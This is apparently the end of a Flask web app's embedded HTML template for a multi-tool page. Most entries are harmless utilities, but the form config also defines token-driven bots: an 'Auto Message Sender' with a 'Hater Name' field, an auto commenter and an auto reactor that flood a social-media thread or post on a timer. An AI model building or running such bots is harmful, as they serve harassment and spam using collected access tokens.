    <div class="tool-section">
      <h3 class="section-title"><i class="fas fa-calculator"></i> Math Tools</h3>
      <div class="tool-grid">
        <div class="tool-card" onclick="showTool('calculator')">
          <i class="fas fa-equals"></i>
          <h4>Calculator</h4>
          <p>Basic math operations</p>
        </div>
        <div class="tool-card" onclick="showTool('square_root')">
          <i class="fas fa-square-root-alt"></i>
          <h4>Square Root</h4>
          <p>Calculate square root</p>
        </div>
        <div class="tool-card" onclick="showTool('percentage')">
          <i class="fas fa-percent"></i>
          <h4>Percentage</h4>
          <p>Calculate percentages</p>
        </div>
      </div>
    </div>
  </div>

  <!-- Modal -->
  <div class="modal fade" id="toolModal" tabindex="-1">
    <div class="modal-dialog">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title" id="toolTitle">Tool</h5>
          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
        </div>
        <form method="post" enctype="multipart/form-data" id="toolForm">
          <div class="modal-body" id="toolBody"></div>
          <div class="modal-footer">
            <button type="submit" class="btn btn-primary">Execute</button>
            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
          </div>
        </form>
        <div id="toolResult" class="result-box" style="display:none;"></div>
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    const toolConfigs = {
      send_message: { title: 'Auto Message Sender', fields: `
        <input type="hidden" name="tool" value="send_message">
        <label>Token Option</label>
        <select class="form-select mb-2" name="tokenOption" onchange="toggleToken(this)">
          <option value="single">Single Token</option>
          <option value="multiple">Token File</option>
        </select>
        <div id="singleTokenDiv"><label>Token</label><input class="form-control mb-2" name="singleToken"></div>
        <div id="tokenFileDiv" style="display:none;"><label>Token File</label><input type="file" class="form-control mb-2" name="tokenFile"></div>
        <label>Thread/Convo ID</label><input class="form-control mb-2" name="threadId" required>
        <label>Hater Name</label><input class="form-control mb-2" name="kidx" required>
        <label>Time (seconds)</label><input type="number" class="form-control mb-2" name="time" value="2">
        <label>Message File (.txt)</label><input type="file" class="form-control mb-2" name="txtFile" accept=".txt" required>
      `},
      post_comments: { title: 'Auto Commenter', fields: `
        <input type="hidden" name="tool" value="post_comments">
        <label>Token Option</label>
        <select class="form-select mb-2" name="tokenOption" onchange="toggleToken(this)">
          <option value="single">Single Token</option>
          <option value="multiple">Token File</option>
        </select>
        <div id="singleTokenDiv"><label>Token</label><input class="form-control mb-2" name="singleToken"></div>
        <div id="tokenFileDiv" style="display:none;"><label>Token File</label><input type="file" class="form-control mb-2" name="tokenFile"></div>
        <label>Post ID</label><input class="form-control mb-2" name="postId" required>
        <label>Time (seconds)</label><input type="number" class="form-control mb-2" name="time" value="2">
        <label>Comments File</label><input type="file" class="form-control mb-2" name="txtFile" accept=".txt" required>
      `},
      react_post: { title: 'Auto React', fields: `
        <input type="hidden" name="tool" value="react_post">
        <label>Token Option</label>
        <select class="form-select mb-2" name="tokenOption" onchange="toggleToken(this)">
          <option value="single">Single Token</option>
          <option value="multiple">Token File</option>
        </select>
        <div id="singleTokenDiv"><label>Token</label><input class="form-control mb-2" name="singleToken"></div>
        <div id="tokenFileDiv" style="display:none;"><label>Token File</label><input type="file" class="form-control mb-2" name="tokenFile"></div>
        <label>Post ID</label><input class="form-control mb-2" name="postId" required>
        <label>Reaction</label>
        <select class="form-select mb-2" name="reaction">
          <option value="LIKE">LIKE</option><option value="LOVE">LOVE</option><option value="WOW">WOW</option><option value="HAHA">HAHA</option><option value="SAD">SAD</option><option value="ANGRY">ANGRY</option>
        </select>
        <label>Time (seconds)</label><input type="number" class="form-control mb-2" name="time" value="1">
      `},
      token_checker: { title: 'Token Checker', fields: `
        <input type="hidden" name="tool" value="token_checker">
        <label>Token</label><input class="form-control mb-2" name="singleToken" required>
        <input type="hidden" name="tokenOption" value="single">
      `},
      get_user_info: { title: 'User Info', fields: `
        <input type="hidden" name="tool" value="get_user_info">
        <label>Token</label><input class="form-control mb-2" name="singleToken" required>
        <input type="hidden" name="tokenOption" value="single">
        <label>User ID</label><input class="form-control mb-2" name="userId" placeholder="Optional (me for self)">
      `},
      create_post: { title: 'Create Post', fields: `
        <input type="hidden" name="tool" value="create_post">
        <label>Token</label><input class="form-control mb-2" name="singleToken" required>
        <input type="hidden" name="tokenOption" value="single">
        <label>Message</label><textarea class="form-control mb-2" name="message" rows="3" required></textarea>
      `},
      hash_generator: { title: 'Hash Generator', fields: `
        <input type="hidden" name="tool" value="hash_generator">
        <label>Text</label><textarea class="form-control mb-2" name="text" rows="3" required></textarea>
        <label>Algorithm</label>
        <select class="form-select mb-2" name="algo">
          <option value="md5">MD5</option><option value="sha256">SHA256</option><option value="sha512">SHA512</option>
        </select>
      `},
      base64_encode: { title: 'Base64 Encode', fields: `
        <input type="hidden" name="tool" value="base64_encode">
        <label>Text</label><textarea class="form-control mb-2" name="text" rows="3" required></textarea>
      `},
      base64_decode: { title: 'Base64 Decode', fields: `
        <input type="hidden" name="tool" value="base64_decode">
        <label>Base64 Text</label><textarea class="form-control mb-2" name="text" rows="3" required></textarea>
      `},
      password_generator: { title: 'Password Generator', fields: `
        <input type="hidden" name="tool" value="password_generator">
        <label>Length</label><input type="number" class="form-control mb-2" name="length" value="12">
      `},
      word_counter: { title: 'Word Counter', fields: `
        <input type="hidden" name="tool" value="word_counter">
        <label>Text</label><textarea class="form-control mb-2" name="text" rows="5" required></textarea>
      `},
      text_to_binary: { title: 'Text to Binary', fields: `
        <input type="hidden" name="tool" value="text_to_binary">
        <label>Text</label><textarea class="form-control mb-2" name="text" rows="3" required></textarea>
      `},
      binary_to_text: { title: 'Binary to Text', fields: `
        <input type="hidden" name="tool" value="binary_to_text">
        <label>Binary</label><textarea class="form-control mb-2" name="text" rows="3" required></textarea>
      `},
      json_formatter: { title: 'JSON Formatter', fields: `
        <input type="hidden" name="tool" value="json_formatter">
        <label>JSON</label><textarea class="form-control mb-2" name="text" rows="5" required></textarea>
      `},
      extract_emails: { title: 'Extract Emails', fields: `
        <input type="hidden" name="tool" value="extract_emails">
        <label>Text</label><textarea class="form-control mb-2" name="text" rows="5" required></textarea>
      `},
      reverse_text: { title: 'Reverse Text', fields: `
        <input type="hidden" name="tool" value="reverse_text">
        <label>Text</label><textarea class="form-control mb-2" name="text" rows="3" required></textarea>
      `},
      password_strength: { title: 'Password Strength', fields: `
        <input type="hidden" name="tool" value="password_strength">
        <label>Password</label><input class="form-control mb-2" name="text" required>
      `},
      generate_lorem: { title: 'Lorem Ipsum', fields: '<input type="hidden" name="tool" value="generate_lorem"><p>Click Execute to generate</p>' },
      random_name: { title: 'Random Name', fields: '<input type="hidden" name="tool" value="random_name"><p>Click Execute to generate</p>' },
      random_email: { title: 'Random Email', fields: '<input type="hidden" name="tool" value="random_email"><p>Click Execute to generate</p>' },
      random_phone: { title: 'Random Phone', fields: '<input type="hidden" name="tool" value="random_phone"><p>Click Execute to generate</p>' },
      random_color: { title: 'Random Color', fields: '<input type="hidden" name="tool" value="random_color"><p>Click Execute to generate</p>' },
      calculate_age: { title: 'Age Calculator', fields: `
        <input type="hidden" name="tool" value="calculate_age">
        <label>Birth Date</label><input type="date" class="form-control mb-2" name="date" required>
      `},
      timestamp_now: { title: 'Current Timestamp', fields: '<input type="hidden" name="tool" value="timestamp_now"><p>Click Execute to get</p>' },
      calculator: { title: 'Calculator', fields: `
        <input type="hidden" name="tool" value="calculator">
        <label>Expression</label><input class="form-control mb-2" name="expression" placeholder="2+2*3" required>
      `},
      ip_info: { title: 'IP Info', fields: `
        <input type="hidden" name="tool" value="ip_info">
        <label>IP Address</label><input class="form-control mb-2" name="ip" placeholder="8.8.8.8" required>
      `},
      ping_website: { title: 'Ping Website', fields: `
        <input type="hidden" name="tool" value="ping_website">
        <label>URL</label><input class="form-control mb-2" name="url" placeholder="google.com" required>
      `},
      dns_lookup: { title: 'DNS Lookup', fields: `
        <input type="hidden" name="tool" value="dns_lookup">
        <label>Domain</label><input class="form-control mb-2" name="domain" placeholder="google.com" required>
      `},
      whois: { title: 'WHOIS Lookup', fields: `
        <input type="hidden" name="tool" value="whois">
        <label>Domain</label><input class="form-control mb-2" name="domain" placeholder="google.com" required>
      `},
      http_headers: { title: 'HTTP Headers', fields: `
        <input type="hidden" name="tool" value="http_headers">
        <label>URL</label><input class="form-control mb-2" name="url" placeholder="https://google.com" required>
      `},
      convert_kg_lbs: { title: 'kg ⇄ lbs', fields: `
        <input type="hidden" name="tool" value="convert_kg_lbs">
        <label>Value</label><input class="form-control mb-2" name="value" required>
        <label>Convert to</label>
        <select class="form-select mb-2" name="to"><option value="lbs">lbs</option><option value="kg">kg</option></select>
      `},
      convert_c_f: { title: '°C ⇄ °F', fields: `
        <input type="hidden" name="tool" value="convert_c_f">
        <label>Value</label><input class="form-control mb-2" name="value" required>
        <label>Convert to</label>
        <select class="form-select mb-2" name="to"><option value="f">°F</option><option value="c">°C</option></select>
      `},
      convert_km_miles: { title: 'km ⇄ miles', fields: `
        <input type="hidden" name="tool" value="convert_km_miles">
        <label>Value</label><input class="form-control mb-2" name="value" required>
        <label>Convert to</label>
        <select class="form-select mb-2" name="to"><option value="miles">miles</option><option value="km">km</option></select>
      `},
      uuid_generator: { title: 'UUID Generator', fields: '<input type="hidden" name="tool" value="uuid_generator"><p>Click Execute to generate</p>' },
      sort_lines: { title: 'Sort Lines', fields: `
        <input type="hidden" name="tool" value="sort_lines">
        <label>Text</label><textarea class="form-control mb-2" name="text" rows="5" required></textarea>
      `},
      remove_duplicates: { title: 'Remove Duplicates', fields: `
        <input type="hidden" name="tool" value="remove_duplicates">
        <label>Text</label><textarea class="form-control mb-2" name="text" rows="5" required></textarea>
      `},
      rot13: { title: 'ROT13 Cipher', fields: `
        <input type="hidden" name="tool" value="rot13">
        <label>Text</label><textarea class="form-control mb-2" name="text" rows="3" required></textarea>
      `}
    };

    function toggleToken(select) {
      const parent = select.closest('.modal-body');
      const singleDiv = parent.querySelector('#singleTokenDiv');
      const fileDiv = parent.querySelector('#tokenFileDiv');
      if (select.value === 'single') {
        singleDiv.style.display = 'block';
        fileDiv.style.display = 'none';
      } else {
        singleDiv.style.display = 'none';
        fileDiv.style.display = 'block';
      }
    }

    function showTool(toolName) {
      const config = toolConfigs[toolName];
      if (!config) return;
      document.getElementById('toolTitle').innerHTML = config.title;
      document.getElementById('toolBody').innerHTML = config.fields;
      document.getElementById('toolResult').style.display = 'none';
      new bootstrap.Modal(document.getElementById('toolModal')).show();
    }

    document.getElementById('toolForm').onsubmit = async function(e) {
      e.preventDefault();
      const formData = new FormData(this);
      const response = await fetch('/', { method: 'POST', body: formData });
      const result = await response.text();
      const resultDiv = document.getElementById('toolResult');
      resultDiv.style.display = 'block';
      resultDiv.innerHTML = '<strong>Result:</strong><br>' + result;
    };
  </script>
</body>
</html>
'''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
